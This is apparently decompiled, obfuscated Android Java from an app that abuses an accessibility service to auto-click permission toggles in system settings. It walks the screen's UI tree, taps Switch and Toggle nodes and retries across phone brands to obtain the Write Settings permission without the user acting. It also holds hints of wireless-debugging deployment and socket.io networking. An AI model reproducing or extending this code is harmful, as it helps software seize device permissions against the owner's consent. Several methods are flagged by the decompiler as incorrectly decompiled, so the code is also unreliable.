package com.storm.safe.rock.service.modules;

import android.accessibilityservice.GestureDescription;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.Path;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.R$string;
import com.storm.safe.rock.iuzxujjtqev;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.util.StringUtil;
import io.socket.engineio.client.transports.PollingXHR;
import io.socket.engineio.parser.Base64;
import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import kotlin.Pair;
import kotlin.coroutines.AbstractC0775a0;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlin.jvm.internal.Ref$BooleanRef;
import kotlin.text.AbstractC0779a1;
import kotlinx.coroutines.AbstractC0780a0;
import kotlinx.coroutines.android.C0785a0;
import okhttp3.internal.p032ws.WebSocketProtocol;
import org.conscrypt.FileClientSessionCache;
import p000.AbstractC0003a2;
import p000.AbstractC0134bh;
import p000.AbstractC0715je;
import p000.AbstractC0716jf;
import p000.AbstractC1117qo;
import p000.AbstractC1262tj;
import p000.C0127ba;
import p000.C0429du;
import p000.C0763km;
import p000.C0873ms;
import p000.C1180rh;
import p000.C1214s9;
import p000.C1351vv;
import p000.RunnableC1053p2;
import p000.b81;
import p000.dh0;
import p000.h10;
import p000.ih1;
import p000.jh1;
import p000.kg1;
import p000.kj1;
import p000.oe0;
import p000.sc0;
import p000.t60;
import p000.tz0;
import p000.u11;
import p000.y21;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.b2 */
/* loaded from: classes2.dex */
public final class C0327b2 {

    /* renamed from: c0 */
    public static final /* synthetic */ int f53165c0 = 0;

    /* renamed from: a0 */
    public final dqtvuisjd f53166a0;

    /* renamed from: a1 */
    public final Context f53167a1;

    /* renamed from: a2 */
    public C0873ms f53168a2;

    /* renamed from: a3 */
    public volatile boolean f53169a3;

    /* renamed from: a4 */
    public volatile boolean f53170a4;

    /* renamed from: a5 */
    public volatile int f53171a5;

    /* renamed from: a6 */
    public volatile long f53172a6;

    /* renamed from: a7 */
    public volatile long f53173a7;

    /* renamed from: a8 */
    public volatile String f53174a8;

    /* renamed from: a9 */
    public volatile int f53175a9;

    /* renamed from: b0 */
    public volatile WriteSettingsPermissionManager$DeviceStrategy f53176b0;

    /* renamed from: b1 */
    public volatile int f53177b1;

    /* renamed from: b2 */
    public volatile boolean f53178b2;

    /* renamed from: b3 */
    public u11 f53179b3;

    /* renamed from: b4 */
    public u11 f53180b4;

    /* renamed from: b5 */
    public final ConcurrentHashMap.KeySetView f53181b5;

    /* renamed from: b6 */
    public final ConcurrentHashMap.KeySetView f53182b6;

    /* renamed from: b7 */
    public final Object f53183b7;

    /* renamed from: b8 */
    public long f53184b8;

    /* renamed from: b9 */
    public volatile boolean f53185b9;

    static {
        new ih1(null);
    }

    public C0327b2(dqtvuisjd dqtvuisjdVar, dqtvuisjd dqtvuisjdVar2) {
        t60.m214695b6(dqtvuisjdVar, "service");
        t60.m214695b6(dqtvuisjdVar2, "context");
        this.f53166a0 = dqtvuisjdVar;
        this.f53167a1 = dqtvuisjdVar2;
        C1180rh c1180rh = AbstractC1262tj.f60233a0;
        C0785a0 c0785a0 = sc0.f59953a0;
        y21 y21Var = new y21();
        c0785a0.getClass();
        this.f53168a2 = AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(c0785a0, y21Var));
        this.f53174a8 = "";
        this.f53176b0 = WriteSettingsPermissionManager$DeviceStrategy.f52895a0;
        ConcurrentHashMap.KeySetView keySetViewNewKeySet = ConcurrentHashMap.newKeySet();
        t60.m214694b5(keySetViewNewKeySet, "newKeySet()");
        this.f53181b5 = keySetViewNewKeySet;
        ConcurrentHashMap.KeySetView keySetViewNewKeySet2 = ConcurrentHashMap.newKeySet();
        t60.m214694b5(keySetViewNewKeySet2, "newKeySet()");
        this.f53182b6 = keySetViewNewKeySet2;
        this.f53183b7 = new Object();
    }

    /* JADX WARN: Code restructure failed: missing block: B:75:0x0115, code lost:
    
        if (r9.m211714a3(r1) == r2) goto L76;
     */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0015  */
    /* renamed from: a0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final Object m211693a0(C0327b2 c0327b2, ContinuationImpl continuationImpl) throws Throwable {
        WriteSettingsPermissionManager$attemptAutoClickSafe$1 writeSettingsPermissionManager$attemptAutoClickSafe$1;
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM211724b8;
        CharSequence packageName;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof WriteSettingsPermissionManager$attemptAutoClickSafe$1) {
            writeSettingsPermissionManager$attemptAutoClickSafe$1 = (WriteSettingsPermissionManager$attemptAutoClickSafe$1) continuationImpl;
            int i = writeSettingsPermissionManager$attemptAutoClickSafe$1.f52900a2;
            if ((i & Integer.MIN_VALUE) != 0) {
                writeSettingsPermissionManager$attemptAutoClickSafe$1.f52900a2 = i - Integer.MIN_VALUE;
            } else {
                writeSettingsPermissionManager$attemptAutoClickSafe$1 = new WriteSettingsPermissionManager$attemptAutoClickSafe$1(c0327b2, continuationImpl);
            }
        }
        Object objM211755g2 = writeSettingsPermissionManager$attemptAutoClickSafe$1.f52898a0;
        Object obj = CoroutineSingletons.f57606a0;
        int i2 = writeSettingsPermissionManager$attemptAutoClickSafe$1.f52900a2;
        try {
            if (i2 != 0) {
                if (i2 == 1) {
                    kg1.m213544f4(objM211755g2);
                    return c1351vv;
                }
                if (i2 == 2) {
                    kg1.m213544f4(objM211755g2);
                    ((Boolean) objM211755g2).booleanValue();
                    return c1351vv;
                }
                if (i2 != 3) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(objM211755g2);
                ((Boolean) objM211755g2).getClass();
                return c1351vv;
            }
            kg1.m213544f4(objM211755g2);
            if (c0327b2.f53171a5 < 8) {
                c0327b2.f53171a5++;
                if (c0327b2.m211734d5()) {
                    c0327b2.m211741e6();
                    return c1351vv;
                }
                if (c0327b2.f53176b0.ordinal() != 0) {
                    AccessibilityNodeInfo rootInActiveWindow = c0327b2.f53166a0.getRootInActiveWindow();
                    if (rootInActiveWindow == null || (packageName = rootInActiveWindow.getPackageName()) == null || (string = packageName.toString()) == null) {
                        string = "";
                    }
                    if (m211708e0(string) || m211707d8(string)) {
                        if (c0327b2.m211736d7()) {
                            ConcurrentHashMap.KeySetView keySetView = c0327b2.f53181b5;
                            try {
                                List listM213303j0 = AbstractC0715je.m213303j0(keySetView);
                                keySetView.clear();
                                Iterator it = listM213303j0.iterator();
                                while (it.hasNext()) {
                                    try {
                                        ((AccessibilityNodeInfo) it.next()).recycle();
                                    } catch (IllegalStateException | Exception unused) {
                                    }
                                }
                            } catch (Exception unused2) {
                            }
                            AccessibilityNodeInfo rootInActiveWindow2 = c0327b2.f53166a0.getRootInActiveWindow();
                            if (rootInActiveWindow2 == null) {
                                return c1351vv;
                            }
                            c0327b2.f53181b5.add(rootInActiveWindow2);
                            AccessibilityNodeInfo accessibilityNodeInfoM211727c1 = c0327b2.m211727c1(rootInActiveWindow2);
                            if (accessibilityNodeInfoM211727c1 != null) {
                                c0327b2.m211746f1(accessibilityNodeInfoM211727c1);
                                writeSettingsPermissionManager$attemptAutoClickSafe$1.f52900a2 = 2;
                                objM211755g2 = c0327b2.m211755g2(10, 1000L, writeSettingsPermissionManager$attemptAutoClickSafe$1);
                                if (objM211755g2 == obj) {
                                }
                                ((Boolean) objM211755g2).booleanValue();
                                return c1351vv;
                            }
                            if (c0327b2.f53171a5 > 3 || (accessibilityNodeInfoM211724b8 = c0327b2.m211724b8(rootInActiveWindow2)) == null) {
                                return c1351vv;
                            }
                            c0327b2.m211746f1(accessibilityNodeInfoM211724b8);
                            writeSettingsPermissionManager$attemptAutoClickSafe$1.f52900a2 = 3;
                            objM211755g2 = c0327b2.m211755g2(10, 1000L, writeSettingsPermissionManager$attemptAutoClickSafe$1);
                            if (objM211755g2 == obj) {
                            }
                            ((Boolean) objM211755g2).getClass();
                            return c1351vv;
                            return obj;
                        }
                    } else if (string.equals(c0327b2.f53167a1.getPackageName())) {
                        c0327b2.m211743e8();
                        AbstractC0780a0.m213692a3(c0327b2.f53168a2, null, new WriteSettingsPermissionManager$attemptAutoClickSafe$2(c0327b2, null), 3);
                        return c1351vv;
                    }
                } else {
                    writeSettingsPermissionManager$attemptAutoClickSafe$1.f52900a2 = 1;
                }
            }
            return c1351vv;
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ 自动点击失败", e);
            return c1351vv;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:101:0x0225, code lost:
    
        if (p000.b81.m210571b1(1000, r8) == r4) goto L102;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:48:0x00c0 A[Catch: Exception -> 0x00cc, TRY_ENTER, TryCatch #1 {Exception -> 0x00cc, blocks: (B:103:0x0228, B:105:0x022e, B:107:0x0232, B:94:0x01bd, B:80:0x018f, B:82:0x0197, B:84:0x019d, B:89:0x01a7, B:91:0x01ad, B:62:0x010a, B:48:0x00c0, B:50:0x00c6, B:56:0x00d2, B:63:0x010d, B:65:0x0112, B:67:0x0116, B:69:0x011c, B:71:0x015b, B:73:0x0161, B:75:0x0169, B:77:0x016f, B:96:0x01d4, B:98:0x01e0, B:100:0x0211), top: B:116:0x010a }] */
    /* JADX WARN: Removed duplicated region for block: B:63:0x010d A[Catch: Exception -> 0x00cc, TryCatch #1 {Exception -> 0x00cc, blocks: (B:103:0x0228, B:105:0x022e, B:107:0x0232, B:94:0x01bd, B:80:0x018f, B:82:0x0197, B:84:0x019d, B:89:0x01a7, B:91:0x01ad, B:62:0x010a, B:48:0x00c0, B:50:0x00c6, B:56:0x00d2, B:63:0x010d, B:65:0x0112, B:67:0x0116, B:69:0x011c, B:71:0x015b, B:73:0x0161, B:75:0x0169, B:77:0x016f, B:96:0x01d4, B:98:0x01e0, B:100:0x0211), top: B:116:0x010a }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Removed duplicated region for block: B:88:0x01a6  */
    /* JADX WARN: Removed duplicated region for block: B:91:0x01ad A[Catch: Exception -> 0x00cc, TryCatch #1 {Exception -> 0x00cc, blocks: (B:103:0x0228, B:105:0x022e, B:107:0x0232, B:94:0x01bd, B:80:0x018f, B:82:0x0197, B:84:0x019d, B:89:0x01a7, B:91:0x01ad, B:62:0x010a, B:48:0x00c0, B:50:0x00c6, B:56:0x00d2, B:63:0x010d, B:65:0x0112, B:67:0x0116, B:69:0x011c, B:71:0x015b, B:73:0x0161, B:75:0x0169, B:77:0x016f, B:96:0x01d4, B:98:0x01e0, B:100:0x0211), top: B:116:0x010a }] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:59:0x00ef -> B:60:0x00f9). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:61:0x0108 -> B:116:0x010a). Please report as a decompilation issue!!! */
    /* renamed from: a1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final Object m211694a1(C0327b2 c0327b2, String str, String str2, ContinuationImpl continuationImpl) throws Throwable {
        C0309x17ceb7e0 c0309x17ceb7e0;
        Object obj;
        String string;
        String str3;
        C0309x17ceb7e0 c0309x17ceb7e02;
        Ref$BooleanRef ref$BooleanRef;
        int i;
        int i2;
        String str4;
        String str5;
        CharSequence packageName;
        String str6;
        u11 u11Var;
        String str7;
        String str8;
        AccessibilityNodeInfo rootInActiveWindow;
        CharSequence packageName2;
        String string2;
        C0327b2 c0327b22 = c0327b2;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof C0309x17ceb7e0) {
            C0309x17ceb7e0 c0309x17ceb7e03 = (C0309x17ceb7e0) continuationImpl;
            int i3 = c0309x17ceb7e03.f52957a9;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                c0309x17ceb7e03.f52957a9 = i3 - Integer.MIN_VALUE;
                c0309x17ceb7e0 = c0309x17ceb7e03;
            } else {
                c0309x17ceb7e0 = new C0309x17ceb7e0(c0327b22, continuationImpl);
            }
        }
        Object obj2 = c0309x17ceb7e0.f52955a7;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = c0309x17ceb7e0.f52957a9;
        String str9 = "";
        if (i4 == 0) {
            kg1.m213544f4(obj2);
            try {
                AccessibilityNodeInfo rootInActiveWindow2 = c0327b22.f53166a0.getRootInActiveWindow();
                if (rootInActiveWindow2 == null || (packageName = rootInActiveWindow2.getPackageName()) == null || (string = packageName.toString()) == null) {
                    string = "";
                }
                str3 = string;
                c0309x17ceb7e02 = c0309x17ceb7e0;
                ref$BooleanRef = new Ref$BooleanRef();
                i = 0;
                i2 = 3;
                str4 = str;
                str5 = str2;
                if (i >= i2) {
                }
                return coroutineSingletons;
            } catch (Exception e) {
                e = e;
                obj = str2;
            }
        } else if (i4 == 1) {
            int i5 = c0309x17ceb7e0.f52954a6;
            int i6 = c0309x17ceb7e0.f52953a5;
            Ref$BooleanRef ref$BooleanRef2 = c0309x17ceb7e0.f52952a4;
            String str10 = c0309x17ceb7e0.f52951a3;
            String str11 = c0309x17ceb7e0.f52950a2;
            String str12 = c0309x17ceb7e0.f52949a1;
            C0327b2 c0327b23 = c0309x17ceb7e0.f52948a0;
            try {
                kg1.m213544f4(obj2);
                C0327b2 c0327b24 = c0327b23;
                String str13 = "";
                C0309x17ceb7e0 c0309x17ceb7e04 = c0309x17ceb7e0;
                int i7 = i5;
                c0327b22 = c0327b24;
                str4 = str12;
                i2 = i6;
                i = i7;
                Ref$BooleanRef ref$BooleanRef3 = ref$BooleanRef2;
                c0309x17ceb7e02 = c0309x17ceb7e04;
                String str14 = str11;
                str3 = str10;
                ref$BooleanRef = ref$BooleanRef3;
                try {
                    i++;
                    str9 = str13;
                    str5 = str14;
                    if (i >= i2) {
                        str6 = str9;
                        if (ref$BooleanRef.f57622a0) {
                            c0327b22.m211741e6();
                            return c1351vv;
                        }
                        if (c0327b22.m211719a8(str4, str3)) {
                            t60.m214726f4("WriteSettingsPerm", "⚠️ 检测到页面跳转: " + str4 + " → " + str3);
                            StringBuilder sb = new StringBuilder();
                            sb.append("📝 控件 ");
                            sb.append(str5);
                            sb.append(" 导致了错误跳转，记录为失败控件");
                            t60.m214726f4("WriteSettingsPerm", sb.toString());
                            c0327b22.f53182b6.add(str5);
                            t60.m214726f4("WriteSettingsPerm", "🛑 取消所有自动点击任务，防止在错误页面继续点击");
                            u11 u11Var2 = c0327b22.f53180b4;
                            if (u11Var2 != null) {
                                u11Var = null;
                                u11Var2.m215253a7(null);
                            } else {
                                u11Var = null;
                            }
                            c0327b22.f53180b4 = u11Var;
                            if (!m211707d8(str3) || !c0327b22.m211736d7()) {
                                t60.m214726f4("WriteSettingsPerm", "⚠️ 跳转到非预期页面，执行返回操作");
                                c0327b22.m211745f0();
                                c0309x17ceb7e02.f52948a0 = c0327b22;
                                c0309x17ceb7e02.f52949a1 = str5;
                                c0309x17ceb7e02.f52950a2 = null;
                                c0309x17ceb7e02.f52951a3 = null;
                                c0309x17ceb7e02.f52952a4 = null;
                                c0309x17ceb7e02.f52957a9 = 2;
                                str8 = str5;
                                if (b81.m210571b1(500L, c0309x17ceb7e02) != coroutineSingletons) {
                                    rootInActiveWindow = c0327b22.f53166a0.getRootInActiveWindow();
                                    if (rootInActiveWindow != null) {
                                        if (m211708e0((rootInActiveWindow != null || (packageName2 = rootInActiveWindow.getPackageName()) == null || (string2 = packageName2.toString()) == null) ? str6 : string2)) {
                                        }
                                    }
                                }
                            }
                            return c1351vv;
                        }
                        if (t60.m214686a2(str3, c0327b22.f53167a1.getPackageName())) {
                            t60.m214726f4("WriteSettingsPerm", "⚠️ 检测到应用意外返回主应用，可能是点击控件导致的");
                            t60.m214726f4("WriteSettingsPerm", "📝 控件 " + str5 + " 导致应用返回，记录为失败控件");
                            c0327b22.f53182b6.add(str5);
                            c0327b22.m211743e8();
                            AbstractC0780a0.m213692a3(c0327b22.f53168a2, null, new C0311x17ceb7e3(c0327b22, null), 3);
                            return c1351vv;
                        }
                        c0309x17ceb7e02.f52948a0 = c0327b22;
                        c0309x17ceb7e02.f52949a1 = str5;
                        c0309x17ceb7e02.f52950a2 = null;
                        c0309x17ceb7e02.f52951a3 = null;
                        c0309x17ceb7e02.f52952a4 = null;
                        c0309x17ceb7e02.f52957a9 = 4;
                        str7 = str5;
                    } else {
                        if (c0327b22.m211734d5()) {
                            ref$BooleanRef.f57622a0 = true;
                        } else if (i < 2) {
                            c0309x17ceb7e02.f52948a0 = c0327b22;
                            c0309x17ceb7e02.f52949a1 = str4;
                            c0309x17ceb7e02.f52950a2 = str5;
                            c0309x17ceb7e02.f52951a3 = str3;
                            c0309x17ceb7e02.f52952a4 = ref$BooleanRef;
                            c0309x17ceb7e02.f52953a5 = i2;
                            c0309x17ceb7e02.f52954a6 = i;
                            c0309x17ceb7e02.f52957a9 = 1;
                            int i8 = i2;
                            str13 = str9;
                            if (b81.m210571b1(300L, c0309x17ceb7e02) != coroutineSingletons) {
                                String str15 = str3;
                                str11 = str5;
                                c0309x17ceb7e04 = c0309x17ceb7e02;
                                ref$BooleanRef2 = ref$BooleanRef;
                                str10 = str15;
                                str12 = str4;
                                c0327b24 = c0327b22;
                                i5 = i;
                                i6 = i8;
                                int i72 = i5;
                                c0327b22 = c0327b24;
                                str4 = str12;
                                i2 = i6;
                                i = i72;
                                Ref$BooleanRef ref$BooleanRef32 = ref$BooleanRef2;
                                c0309x17ceb7e02 = c0309x17ceb7e04;
                                String str142 = str11;
                                str3 = str10;
                                ref$BooleanRef = ref$BooleanRef32;
                                i++;
                                str9 = str13;
                                str5 = str142;
                                if (i >= i2) {
                                }
                            }
                        }
                        str13 = str9;
                        i2 = i2;
                        str142 = str5;
                        i++;
                        str9 = str13;
                        str5 = str142;
                        if (i >= i2) {
                        }
                    }
                    return coroutineSingletons;
                } catch (Exception e2) {
                    e = e2;
                    obj = str142;
                }
            } catch (Exception e3) {
                e = e3;
                obj = str11;
                c0327b22 = c0327b23;
            }
        } else if (i4 != 2) {
            try {
                if (i4 == 3) {
                    String str16 = c0309x17ceb7e0.f52949a1;
                    C0327b2 c0327b25 = c0309x17ceb7e0.f52948a0;
                    kg1.m213544f4(obj2);
                    c0327b22 = c0327b25;
                    c0327b22.f53171a5 = Math.max(0, c0327b22.f53171a5 - 1);
                    AbstractC0780a0.m213692a3(c0327b22.f53168a2, null, new C0310x17ceb7e2(c0327b22, null), 3);
                    return c1351vv;
                }
                if (i4 != 4) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                String str17 = c0309x17ceb7e0.f52949a1;
                C0327b2 c0327b26 = c0309x17ceb7e0.f52948a0;
                kg1.m213544f4(obj2);
                str7 = str17;
                c0327b22 = c0327b26;
                if (c0327b22.m211734d5()) {
                    c0327b22.m211741e6();
                    return c1351vv;
                }
                t60.m214726f4("WriteSettingsPerm", "⚠️ 点击无效：页面未跳转且权限未获取");
                t60.m214726f4("WriteSettingsPerm", "📝 控件 " + str7 + " 点击无效，记录为失败控件");
                c0327b22.f53182b6.add(str7);
                return c1351vv;
            } catch (Exception e4) {
                e = e4;
                C0327b2 c0327b27 = c0309x17ceb7e0;
                obj = c0327b22;
                c0327b22 = c0327b27;
            }
        } else {
            String str18 = c0309x17ceb7e0.f52949a1;
            C0327b2 c0327b28 = c0309x17ceb7e0.f52948a0;
            try {
                kg1.m213544f4(obj2);
                c0309x17ceb7e02 = c0309x17ceb7e0;
                str6 = "";
                str8 = str18;
                c0327b22 = c0327b28;
                rootInActiveWindow = c0327b22.f53166a0.getRootInActiveWindow();
                if (m211708e0((rootInActiveWindow != null || (packageName2 = rootInActiveWindow.getPackageName()) == null || (string2 = packageName2.toString()) == null) ? str6 : string2)) {
                    c0309x17ceb7e02.f52948a0 = c0327b22;
                    c0309x17ceb7e02.f52949a1 = str8;
                    c0309x17ceb7e02.f52957a9 = 3;
                    if (b81.m210571b1(500L, c0309x17ceb7e02) == coroutineSingletons) {
                        return coroutineSingletons;
                    }
                    c0327b22.f53171a5 = Math.max(0, c0327b22.f53171a5 - 1);
                    AbstractC0780a0.m213692a3(c0327b22.f53168a2, null, new C0310x17ceb7e2(c0327b22, null), 3);
                }
                return c1351vv;
            } catch (Exception e5) {
                e = e5;
                obj = str18;
                c0327b22 = c0327b28;
            }
        }
        t60.m214705c6("WriteSettingsPerm", "❌ 检查点击后页面状态失败", e);
        c0327b22.f53182b6.add(obj);
        t60.m214726f4("WriteSettingsPerm", "🛑 取消所有自动点击任务，防止在错误页面继续点击");
        u11 u11Var3 = c0327b22.f53180b4;
        if (u11Var3 != null) {
            u11Var3.m215253a7(null);
        }
        c0327b22.f53180b4 = null;
        return c1351vv;
    }

    /* renamed from: a9 */
    public static int m211695a9(AccessibilityNodeInfo accessibilityNodeInfo) {
        int childCount = accessibilityNodeInfo.getChildCount();
        int iM211695a9 = 1;
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                iM211695a9 = m211695a9(child) + iM211695a9;
            }
        }
        return iM211695a9;
    }

    /* renamed from: b0 */
    public static void m211696b0() {
        String str;
        try {
            int i = Build.VERSION.SDK_INT;
            if (i < 30) {
                str = "Android " + i + " 不支持无线调试";
            } else {
                str = kg1.m213519c5() ? "华为全系不支持无线调试" : kg1.m213518c4() ? "荣耀入门机不支持无线调试" : "设备不支持无线调试";
            }
            t60.m214714d6("WriteSettingsPerm", "★★★ " + str + "，跳过 local-service 所有操作（需 USB 手动部署）★★★");
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "★★★ deployLocalService 异常 ★★★", e);
        }
    }

    /* renamed from: b1 */
    public static String m211697b1() {
        String str = Build.BRAND;
        t60.m214694b5(str, "BRAND");
        Locale locale = Locale.ROOT;
        String lowerCase = str.toLowerCase(locale);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String str2 = Build.MANUFACTURER;
        t60.m214694b5(str2, "MANUFACTURER");
        String lowerCase2 = str2.toLowerCase(locale);
        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String str3 = "vivo";
        if (!AbstractC0779a1.m213652a5(lowerCase, "vivo", false) && !AbstractC0779a1.m213652a5(lowerCase, "iqoo", false)) {
            str3 = "oppo";
            if (!AbstractC0779a1.m213652a5(lowerCase, "oppo", false) && !AbstractC0779a1.m213652a5(lowerCase2, "oppo", false)) {
                str3 = "honor";
                if (!AbstractC0779a1.m213652a5(lowerCase, "honor", false) && !AbstractC0779a1.m213652a5(lowerCase, "hihonor", false)) {
                    str3 = "xiaomi";
                    if (!AbstractC0779a1.m213652a5(lowerCase, "xiaomi", false) && !AbstractC0779a1.m213652a5(lowerCase, "redmi", false)) {
                        return AbstractC0779a1.m213652a5(lowerCase, "oneplus", false) ? "oneplus" : (AbstractC0779a1.m213652a5(lowerCase, "huawei", false) || AbstractC0779a1.m213652a5(lowerCase2, "huawei", false)) ? "huawei" : AbstractC0779a1.m213652a5(lowerCase, "samsung", false) ? "samsung" : AbstractC0779a1.m213652a5(lowerCase, "realme", false) ? "realme" : AbstractC0779a1.m213652a5(lowerCase, "meizu", false) ? "meizu" : "generic";
                    }
                    if (AbstractC0779a1.m213652a5(lowerCase, "redmi", false)) {
                        return "redmi";
                    }
                }
            }
        }
        return str3;
    }

    /* renamed from: b4 */
    public static void m211698b4(AccessibilityNodeInfo accessibilityNodeInfo, h10 h10Var, ArrayList arrayList) {
        try {
            if (((Boolean) h10Var.invoke(accessibilityNodeInfo)).booleanValue()) {
                arrayList.add(accessibilityNodeInfo);
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null) {
                    m211698b4(child, h10Var, arrayList);
                }
            }
        } catch (Exception unused) {
        }
    }

    /* renamed from: b7 */
    public static ArrayList m211699b7(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        ArrayList arrayList = new ArrayList();
        try {
            C0127ba c0127ba = new C0127ba();
            c0127ba.addLast(accessibilityNodeInfo);
            while (!c0127ba.isEmpty()) {
                AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) c0127ba.removeFirst();
                CharSequence className = accessibilityNodeInfo2.getClassName();
                if (className == null || (string = className.toString()) == null) {
                    string = "";
                }
                if ((AbstractC0779a1.m213652a5(string, "Switch", true) || AbstractC0779a1.m213652a5(string, "Toggle", true) || AbstractC0779a1.m213652a5(string, "CompoundButton", true) || AbstractC0779a1.m213652a5(string, "CheckBox", true) || AbstractC0779a1.m213652a5(string, "RadioButton", true)) && accessibilityNodeInfo2.isVisibleToUser()) {
                    Rect rect = new Rect();
                    accessibilityNodeInfo2.getBoundsInScreen(rect);
                    if (!rect.isEmpty() && rect.width() > 0 && rect.height() > 0) {
                        arrayList.add(accessibilityNodeInfo2);
                    }
                }
                int childCount = accessibilityNodeInfo2.getChildCount();
                for (int i = 0; i < childCount; i++) {
                    AccessibilityNodeInfo child = accessibilityNodeInfo2.getChild(i);
                    if (child != null) {
                        c0127ba.addLast(child);
                    }
                }
            }
            return arrayList;
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ 查找Switch控件异常", e);
            return arrayList;
        }
    }

    /* renamed from: c2 */
    public static AccessibilityNodeInfo m211700c2(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        try {
            C0127ba c0127ba = new C0127ba();
            c0127ba.addLast(accessibilityNodeInfo);
            while (!c0127ba.isEmpty()) {
                AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) c0127ba.removeFirst();
                CharSequence className = accessibilityNodeInfo2.getClassName();
                if (className == null || (string = className.toString()) == null) {
                    string = "";
                }
                if ((AbstractC0779a1.m213652a5(string, "Switch", true) || AbstractC0779a1.m213652a5(string, "Toggle", true) || AbstractC0779a1.m213652a5(string, "CompoundButton", true)) && accessibilityNodeInfo2.isVisibleToUser()) {
                    return accessibilityNodeInfo2;
                }
                int childCount = accessibilityNodeInfo2.getChildCount();
                for (int i = 0; i < childCount; i++) {
                    AccessibilityNodeInfo child = accessibilityNodeInfo2.getChild(i);
                    if (child != null) {
                        c0127ba.addLast(child);
                    }
                }
            }
            return null;
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "查找Switch节点异常", e);
            return null;
        }
    }

    /* renamed from: c4 */
    public static AccessibilityNodeInfo m211701c4(AccessibilityNodeInfo accessibilityNodeInfo, String str, int i) {
        String string;
        String string2;
        String string3;
        String string4;
        if (i > 15) {
            return null;
        }
        try {
            CharSequence text = accessibilityNodeInfo.getText();
            String str2 = "";
            if (text == null || (string4 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string4).toString()) == null) {
                string = "";
            }
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription != null && (string2 = contentDescription.toString()) != null && (string3 = AbstractC0779a1.m213687e0(string2).toString()) != null) {
                str2 = string3;
            }
            if (!AbstractC0779a1.m213652a5(string, str, true) && !AbstractC0779a1.m213652a5(str2, str, true)) {
                int childCount = accessibilityNodeInfo.getChildCount();
                for (int i2 = 0; i2 < childCount; i2++) {
                    AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                    if (child != null) {
                        AccessibilityNodeInfo accessibilityNodeInfoM211701c4 = m211701c4(child, str, i + 1);
                        if (accessibilityNodeInfoM211701c4 != null) {
                            if (!accessibilityNodeInfoM211701c4.equals(child)) {
                                m211711f4(child);
                            }
                            return accessibilityNodeInfoM211701c4;
                        }
                        m211711f4(child);
                    }
                }
                return null;
            }
            return accessibilityNodeInfo;
        } catch (Exception unused) {
            return null;
        }
    }

    /* renamed from: c7 */
    public static AccessibilityNodeInfo m211702c7(AccessibilityNodeInfo accessibilityNodeInfo, Rect rect) {
        ArrayList arrayList = new ArrayList();
        m211703c8(rect.right, rect.centerY(), accessibilityNodeInfo, arrayList);
        List listM213300i7 = AbstractC0715je.m213300i7(arrayList, new C1214s9(14));
        if (!listM213300i7.isEmpty()) {
            return (AccessibilityNodeInfo) ((Pair) listM213300i7.get(0)).f57556a0;
        }
        t60.m214726f4("WriteSettingsPerm", "[findRightSide] ❌ 未找到右侧控件");
        return null;
    }

    /* renamed from: c8 */
    public static final void m211703c8(int i, int i2, AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        boolean z = true;
        boolean z2 = rectM24a5.left > i + (-50);
        boolean z3 = Math.abs(rectM24a5.centerY() - i2) < 100;
